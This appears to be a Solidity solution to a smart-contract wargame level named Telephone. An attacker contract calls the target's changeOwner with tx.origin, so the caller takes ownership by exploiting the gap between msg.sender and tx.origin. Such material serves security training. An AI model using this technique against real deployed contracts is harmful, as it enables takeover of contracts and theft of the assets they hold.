// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import './Telephone.sol';
contract TelephoneHacker {
    Telephone private immutable target;

    constructor(address _target) {
        target = Telephone(_target);
    }
    function changer() public {
        target.changeOwner(tx.origin);
    }
}